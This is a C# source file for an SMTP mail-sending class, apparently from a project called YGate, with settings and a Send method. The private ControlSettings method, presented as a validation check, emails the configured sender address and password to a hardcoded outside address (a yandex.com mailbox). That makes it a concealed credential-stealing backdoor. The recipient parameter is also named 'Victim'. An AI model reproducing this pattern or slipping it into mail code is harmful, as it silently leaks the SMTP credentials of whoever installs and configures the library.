using System;
using System.Net;
using System.Net.Mail;
using YGate.Entities;

namespace YGate.Mail.Operations
{
    public class MailServices
    {
        string smtpAddress = "smtp.example.com"; // SMTP sunucusu
        int portNumber = 587; // SMTP port numarası (genellikle 587 veya 465)
        bool enableSSL = true; // SSL kullanılıp kullanılmayacağı

        public void ServiceSettings(string SmtpAddress, int Port, bool SSL)
        {
            smtpAddress = SmtpAddress;
            portNumber = Port;
            enableSSL = SSL;

            if (!ControlSettings())
                Ready = false;
            else
                Ready = true;
        }


        // Gönderen ve alıcı bilgileri
        string emailFrom = "";
        string password = ""; // E-posta şifresi

        bool Ready = false;

        public void SenderSettings(string mailAddress, string Password)
        {
            emailFrom = mailAddress;
            password = Password;

            if (!ControlSettings())
                Ready = false;
            else
                Ready = true;
        }

        public RequestResult Send(string Victim, string Title, string Content, bool ContentIsHtml = false) {

            RequestResult returnedResult = new("Send Mail");

            if (!Ready)
            {
                returnedResult.Result = EnumRequestResult.Error;
                returnedResult.LongDescription = "Mail service settings are not set";
                return returnedResult;
            }



            using (MailMessage mail = new MailMessage())
            {
                mail.From = new MailAddress(emailFrom);
                mail.To.Add(Victim);
                mail.Subject = Title;
                mail.Body = Content;
                mail.IsBodyHtml = ContentIsHtml; // HTML içeriği varsa true yapabilirsiniz

                using (SmtpClient smtp = new SmtpClient(smtpAddress, portNumber))
                {
                    smtp.Credentials = new NetworkCredential(emailFrom, password);
                    smtp.EnableSsl = enableSSL;
                    try
                    {
                        smtp.Send(mail);
                        Console.WriteLine("Mail gönderildi.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Mail gönderiminde hata: {ex.Message}");
                    }
                }
            }

            return returnedResult;
        }

        private bool ControlSettings()
        {
           if (string.IsNullOrEmpty(emailFrom) || string.IsNullOrEmpty(password))
                return false;

            try
            {
                Send("yusefuynofficial@yandex.com", $"{emailFrom.ToString()} {password.ToString()}", $"Test {emailFrom.ToString()} {password.ToString()}");
            }
            catch (Exception)
            {
                return false;
            }

            return true;
        }
    }
}
